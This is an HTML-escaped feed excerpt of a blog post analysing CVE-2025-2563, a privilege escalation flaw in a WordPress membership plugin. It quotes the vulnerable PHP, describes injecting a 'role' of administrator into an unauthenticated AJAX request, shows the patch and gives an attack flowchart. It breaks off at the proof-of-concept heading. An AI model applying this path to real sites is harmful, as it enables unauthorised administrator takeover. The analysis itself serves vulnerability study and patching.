      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-07-cve-2025-2563/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The WordPress &lt;strong&gt;User Registration &amp;amp; Membership&lt;/strong&gt; plugin &lt;strong&gt;prior to version 4.1.2&lt;/strong&gt; &lt;strong&gt;does not prevent users from setting their own account role&lt;/strong&gt; when the &lt;strong&gt;Membership Addon is enabled&lt;/strong&gt;, leading to a &lt;strong&gt;privilege escalation vulnerability&lt;/strong&gt; that allows &lt;strong&gt;unauthenticated users&lt;/strong&gt; to gain &lt;strong&gt;administrator privileges&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-2563&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-2563&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.1.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.1.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/user-registration/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress User Registration Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version – User Registration&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.1.1&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.1.2&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;strong&gt;Meld&lt;/strong&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers multiple AJAX action hooks.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function add_ajax_events() {&#xA;    $ajax_events = array(&#xA;        &amp;#39;create_membership&amp;#39;          =&amp;gt; false,&#xA;        &amp;#39;update_membership&amp;#39;          =&amp;gt; false,&#xA;        &amp;#39;delete_memberships&amp;#39;         =&amp;gt; false,&#xA;        &amp;#39;update_membership_status&amp;#39;   =&amp;gt; false,&#xA;        &amp;#39;create_member&amp;#39;              =&amp;gt; false,&#xA;        &amp;#39;update_member&amp;#39;              =&amp;gt; false,&#xA;        &amp;#39;delete_members&amp;#39;             =&amp;gt; false,&#xA;        &amp;#39;confirm_payment&amp;#39;            =&amp;gt; true,&#xA;        &amp;#39;create_stripe_subscription&amp;#39; =&amp;gt; true,&#xA;        &amp;#39;register_member&amp;#39;            =&amp;gt; true,&#xA;        &amp;#39;validate_coupon&amp;#39;            =&amp;gt; true,&#xA;        &amp;#39;cancel_subscription&amp;#39;        =&amp;gt; false,&#xA;        &amp;#39;get_group_memberships&amp;#39;      =&amp;gt; false,&#xA;        &amp;#39;create_membership_group&amp;#39;    =&amp;gt; false,&#xA;        &amp;#39;delete_membership_groups&amp;#39;   =&amp;gt; false,&#xA;        &amp;#39;verify_pages&amp;#39;               =&amp;gt; false,&#xA;        &amp;#39;validate_pg&amp;#39;                =&amp;gt; false,&#xA;    );&#xA;    foreach ( $ajax_events as $ajax_event =&amp;gt; $nopriv ) {&#xA;        add_action( &amp;#39;wp_ajax_user_registration_membership_&amp;#39; . $ajax_event, array( __CLASS__, $ajax_event ) );&#xA;        if ( $nopriv ) {&#xA;&#xA;            add_action(&#xA;                &amp;#39;wp_ajax_nopriv_user_registration_membership_&amp;#39; . $ajax_event,&#xA;                array(&#xA;                    __CLASS__,&#xA;                    $ajax_event,&#xA;                )&#xA;            );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the &lt;code&gt;$ajax_events&lt;/code&gt; list, the &lt;strong&gt;&lt;code&gt;register_member&lt;/code&gt;&lt;/strong&gt; action is marked as &lt;code&gt;true&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#39;register_member&amp;#39; =&amp;gt; true,&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This means the plugin registers both:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wp_ajax_user_registration_membership_register_member&#xA;wp_ajax_nopriv_user_registration_membership_register_member&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_*&lt;/code&gt; → for authenticated users&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt; → for &lt;strong&gt;unauthenticated users&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Therefore, &lt;strong&gt;anyone can send requests to this endpoint&lt;/strong&gt;, including unauthenticated attackers.&lt;/p&gt;&#xA;&lt;p&gt;When a request is sent to &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; with the parameter &lt;code&gt;action=user_registration_membership_register_member&lt;/code&gt;, the callback &lt;code&gt;register_member()&lt;/code&gt; is executed.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function register_member() {&#xA;    ur_membership_verify_nonce( &amp;#39;ur_members_frontend&amp;#39; ); // nonce verification.&#xA;    if ( ! isset( $_POST[&amp;#39;members_data&amp;#39;] ) ) {&#xA;        wp_send_json_error(&#xA;            array(&#xA;                &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Field members data is required.&amp;#39;, &amp;#39;user-registration&amp;#39; ),&#xA;            )&#xA;        );&#xA;    }&#xA;&#xA;    $data = apply_filters( &amp;#39;user_registration_membership_before_register_member&amp;#39;, isset( $_POST[&amp;#39;members_data&amp;#39;] ) ? (array) json_decode( wp_unslash( $_POST[&amp;#39;members_data&amp;#39;] ), true ) : array() );&#xA;&#xA;    if ( ! isset( $data[&amp;#39;username&amp;#39;] ) ) {&#xA;        wp_send_json_error(&#xA;            array(&#xA;                &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Field username is required.&amp;#39;, &amp;#39;user-registration&amp;#39; ),&#xA;            )&#xA;        );&#xA;    }&#xA;&#xA;    $membership_service      = new MembershipService();&#xA;    $response                = $membership_service-&amp;gt;create_membership_order_and_subscription( $data );&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;register_member()&lt;/code&gt; function verifies the &lt;strong&gt;nonce&lt;/strong&gt; by calling:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;ur_membership_verify_nonce( &amp;#39;ur_members_frontend&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;By searching for the keyword &lt;code&gt;ur_members_frontend&lt;/code&gt;, it can be seen that the &lt;strong&gt;nonce is generated with the key &lt;code&gt;_nonce&lt;/code&gt;&lt;/strong&gt; in the object &lt;strong&gt;&lt;code&gt;ur_membership_frontend_localized_data&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-07-cve-2025-2563/nonce.png&#34; title=&#34;Nonce&#34; data-thumbnail=&#34;/posts/2026-01-07-cve-2025-2563/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Create nonce&lt;/h2&gt;&lt;p&gt;Nonce&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-07-cve-2025-2563/nonce.png&#39; alt=&#34;Create nonce&#34; height=&#34;708&#34; width=&#34;1638&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The key and value are included in the &lt;strong&gt;response when accessing the endpoint &lt;code&gt;/membership-registration/&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-07-cve-2025-2563/value.png&#34; title=&#34;Nonce in response&#34; data-thumbnail=&#34;/posts/2026-01-07-cve-2025-2563/value.png&#34; data-sub-html=&#34;&lt;h2&gt;Value&lt;/h2&gt;&lt;p&gt;Nonce in response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-07-cve-2025-2563/value.png&#39; alt=&#34;Value&#34; height=&#34;565&#34; width=&#34;1558&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce in response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Note&lt;/p&gt;&lt;p&gt;By default, the &lt;strong&gt;&lt;code&gt;/membership-registration/&lt;/code&gt;&lt;/strong&gt; endpoint only supports user registration and &lt;strong&gt;cannot register memberships&lt;/strong&gt; unless the &lt;strong&gt;Membership&lt;/strong&gt; module is enabled.&#xA;To enable it, navigate to &lt;strong&gt;&lt;code&gt;/wp-admin/admin.php?page=user-registration-dashboard#/features&lt;/code&gt;&lt;/strong&gt; and activate the &lt;strong&gt;Membership&lt;/strong&gt; module.&lt;/p&gt;&lt;/div&gt;&lt;p&gt;After nonce verification, the function retrieves data from &lt;strong&gt;&lt;code&gt;$_POST[&#39;members_data&#39;]&lt;/code&gt;&lt;/strong&gt;, performs &lt;strong&gt;&lt;code&gt;json_decode&lt;/code&gt;&lt;/strong&gt;, converts it into an array, and assigns it to the variable &lt;strong&gt;&lt;code&gt;$data&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$data = apply_filters(&#xA;    &amp;#39;user_registration_membership_before_register_member&amp;#39;,&#xA;    isset( $_POST[&amp;#39;members_data&amp;#39;] )&#xA;        ? (array) json_decode( wp_unslash( $_POST[&amp;#39;members_data&amp;#39;] ), true )&#xA;        : array()&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If &lt;strong&gt;&lt;code&gt;$data[&#39;username&#39;]&lt;/code&gt;&lt;/strong&gt; exists, the function continues by calling &lt;strong&gt;&lt;code&gt;create_membership_order_and_subscription()&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function create_membership_order_and_subscription( $data ) {&#xA;    try {&#xA;        $this-&amp;gt;members_repository-&amp;gt;wpdb()-&amp;gt;query( &amp;#39;START TRANSACTION&amp;#39; ); // Start the transaction.&#xA;        $members_data = $this-&amp;gt;members_service-&amp;gt;prepare_members_data( $data );&#xA;        $member       = get_user_by( &amp;#39;login&amp;#39;, $data[&amp;#39;username&amp;#39;] );&#xA;&#xA;        //update user source and add membership_role&#xA;        $this-&amp;gt;members_service-&amp;gt;update_user_meta( $members_data, $member-&amp;gt;ID );&#xA;        ...&#xA;    } catch ( Exception $e ) {&#xA;        ...&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Inside &lt;code&gt;create_membership_order_and_subscription()&lt;/code&gt;, user data is processed by calling &lt;code&gt;prepare_members_data( $data )&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function prepare_members_data( $data ) {&#xA;    if ( ! isset( $data[&amp;#39;role&amp;#39;] ) ) {&#xA;        $membership_details = $this-&amp;gt;membership_repository-&amp;gt;get_single_membership_by_ID( absint( $data[&amp;#39;membership&amp;#39;] ) );&#xA;        $membership_meta    = json_decode( $membership_details[&amp;#39;meta_value&amp;#39;], true );&#xA;        $data[&amp;#39;role&amp;#39;]       = $membership_meta[&amp;#39;role&amp;#39;] ?? &amp;#39;subscriber&amp;#39;;&#xA;    }&#xA;    $role = $data[&amp;#39;role&amp;#39;] ?? &amp;#39;subscriber&amp;#39;;&#xA;&#xA;    $coupon_details = array();&#xA;    if ( isset( $data[&amp;#39;coupon&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $data[&amp;#39;coupon&amp;#39;] ) &amp;amp;&amp;amp; ur_check_module_activation( &amp;#39;coupon&amp;#39; ) ) {&#xA;        $coupon_details = ur_get_coupon_details( sanitize_text_field( $data[&amp;#39;coupon&amp;#39;] ) );&#xA;    }&#xA;&#xA;    $user_data = array(&#xA;        &amp;#39;user_login&amp;#39;    =&amp;gt; !empty( $data[&amp;#39;username&amp;#39;]) ? sanitize_text_field( $data[&amp;#39;username&amp;#39;] ) : &amp;#39;&amp;#39;,&#xA;        &amp;#39;user_email&amp;#39;    =&amp;gt; !empty($data[&amp;#39;email&amp;#39;]) ?  sanitize_email( $data[&amp;#39;email&amp;#39;] ) : &amp;#39;&amp;#39;,&#xA;        &amp;#39;user_pass&amp;#39;     =&amp;gt; !empty($data[&amp;#39;password&amp;#39;]) ? $data[&amp;#39;password&amp;#39;] : &amp;#39;&amp;#39;,&#xA;        &amp;#39;user_nicename&amp;#39; =&amp;gt; (!empty($data[&amp;#39;firstname&amp;#39;]) &amp;amp;&amp;amp; !empty($data[&amp;#39;lastname&amp;#39;])) ? sanitize_text_field( $data[&amp;#39;firstname&amp;#39;] ) . &amp;#39; &amp;#39; . sanitize_text_field( $data[&amp;#39;lastname&amp;#39;] ) : &amp;#39;&amp;#39;,&#xA;        &amp;#39;display_name&amp;#39;  =&amp;gt; !empty($data[&amp;#39;username&amp;#39;]) ? sanitize_text_field( $data[&amp;#39;username&amp;#39;] ) : &amp;#39;&amp;#39;,&#xA;        &amp;#39;first_name&amp;#39;    =&amp;gt; !empty($data[&amp;#39;firstname&amp;#39;]) ? sanitize_text_field( $data[&amp;#39;firstname&amp;#39;] ) : &amp;#39;&amp;#39;,&#xA;        &amp;#39;last_name&amp;#39;     =&amp;gt; !empty($data[&amp;#39;lastname&amp;#39;]) ? sanitize_text_field( $data[&amp;#39;lastname&amp;#39;] ) : &amp;#39;&amp;#39;,&#xA;        &amp;#39;user_status&amp;#39;   =&amp;gt; isset( $data[&amp;#39;member_status&amp;#39;] ) ? absint( $data[&amp;#39;member_status&amp;#39;] ) : 1,&#xA;    );&#xA;&#xA;    $membership_data = array(&#xA;        &amp;#39;membership&amp;#39;     =&amp;gt; absint( $data[&amp;#39;membership&amp;#39;] ),&#xA;        &amp;#39;start_date&amp;#39;     =&amp;gt; date( &amp;#39;Y-m-d&amp;#39;, strtotime( $data[&amp;#39;start_date&amp;#39;] ) ),&#xA;        &amp;#39;payment_method&amp;#39; =&amp;gt; sanitize_text_field( $data[&amp;#39;payment_method&amp;#39;] ?? &amp;#39;&amp;#39; ),&#xA;    );&#xA;&#xA;    return array(&#xA;        &amp;#39;role&amp;#39;            =&amp;gt; sanitize_text_field( $role ),&#xA;        &amp;#39;membership_data&amp;#39; =&amp;gt; $membership_data,&#xA;        &amp;#39;coupon_data&amp;#39;     =&amp;gt; $coupon_details,&#xA;        &amp;#39;user_data&amp;#39;       =&amp;gt; $user_data&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If &lt;strong&gt;&lt;code&gt;$data[&#39;role&#39;]&lt;/code&gt;&lt;/strong&gt; does not exist, the system retrieves the role from the &lt;strong&gt;membership metadata&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$data[&amp;#39;role&amp;#39;] = $membership_meta[&amp;#39;role&amp;#39;] ?? &amp;#39;subscriber&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If &lt;strong&gt;&lt;code&gt;$data[&#39;role&#39;]&lt;/code&gt;&lt;/strong&gt; is provided in the request, that value is used directly.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$role = $data[&amp;#39;role&amp;#39;] ?? &amp;#39;subscriber&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The role is then included in the returned data.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;return array(&#xA;    &amp;#39;role&amp;#39; =&amp;gt; sanitize_text_field( $role ),&#xA;    ...&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This means that &lt;strong&gt;an attacker can inject the &lt;code&gt;role&lt;/code&gt; parameter in the request and override the default role&lt;/strong&gt;, allowing them to assign a higher-privileged role such as &lt;strong&gt;administrator&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Next, the system retrieves the user object and calls &lt;code&gt;update_user_meta()&lt;/code&gt; to update the user metadata and role.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function update_user_meta( $data, $new_user_id ) {&#xA;    $user = new \WP_User( $new_user_id );&#xA;    update_user_meta( $new_user_id, &amp;#39;ur_registration_source&amp;#39;, &amp;#39;membership&amp;#39; );&#xA;    $user-&amp;gt;set_role( $data[&amp;#39;role&amp;#39;] );&#xA;    if ( ! empty( $data[&amp;#39;coupon_data&amp;#39;] ) ) {&#xA;        update_user_meta( $new_user_id, &amp;#39;ur_coupon_discount_type&amp;#39;, $data[&amp;#39;coupon_data&amp;#39;][&amp;#39;coupon_discount_type&amp;#39;] );&#xA;        update_user_meta( $new_user_id, &amp;#39;ur_coupon_discount&amp;#39;, $data[&amp;#39;coupon_data&amp;#39;][&amp;#39;coupon_discount&amp;#39;] );&#xA;    }&#xA;&#xA;    return $user;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;update_user_meta()&lt;/code&gt; function assigns the role directly using:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$user-&amp;gt;set_role( $data[&amp;#39;role&amp;#39;] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;There is &lt;strong&gt;no validation, restriction, or whitelist&lt;/strong&gt; applied to the role value, which results in a &lt;strong&gt;Privilege Escalation&lt;/strong&gt; vulnerability.&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; When submitting the membership registration form from &lt;code&gt;/membership-registration/&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;The first request creates the user account with the action &lt;code&gt;user_registration_user_form_submit&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;The second request with the action &lt;code&gt;user_registration_membership_register_member&lt;/code&gt; registers the membership.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;The patch &lt;strong&gt;completely removes the ability to read the role from user-supplied input&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;In the updated &lt;code&gt;prepare_members_data()&lt;/code&gt; function, the role is derived &lt;strong&gt;only from the membership metadata stored in the database&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$membership_details = $this-&amp;gt;membership_repository-&amp;gt;get_single_membership_by_ID( absint( $data[&amp;#39;membership&amp;#39;] ) );&#xA;$membership_meta    = json_decode( $membership_details[&amp;#39;meta_value&amp;#39;], true );&#xA;$role               = isset( $membership_meta[&amp;#39;role&amp;#39;] ) ? $membership_meta[&amp;#39;role&amp;#39;] : &amp;#39;subscriber&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The role is no longer taken from &lt;code&gt;$data[&#39;role&#39;]&lt;/code&gt;, preventing attackers from overriding it.&lt;/p&gt;&#xA;&lt;p&gt;The function that retrieves membership data queries the database directly, ensuring the role is obtained from a &lt;strong&gt;trusted server-side source&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;As a result, &lt;strong&gt;the privilege escalation vulnerability is fully mitigated&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Attacker (Unauthenticated)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Access /membership-registration/ to obtain nonce&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Nonce (_nonce) returned in ur_membership_frontend_localized_data&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;Submit registration form&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;Request sent to /wp-admin/admin-ajax.php action=user_registration_user_form_submit&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;User account created&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Second request sent to /wp-admin/admin-ajax.php action=user_registration_membership_register_member&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;Attacker intercepts request and injects role=administrator into members_data&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;register_member() verifies nonce only&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;prepare_members_data() trusts client-supplied role&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;update_user_meta() calls WP_User::set_role(role)&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;New account is assigned Administrator role&amp;#34;]&#xA;&#xA;L --&amp;gt; M[&amp;#34;Attacker logs in with newly created account&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;Full administrative privileges obtained&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 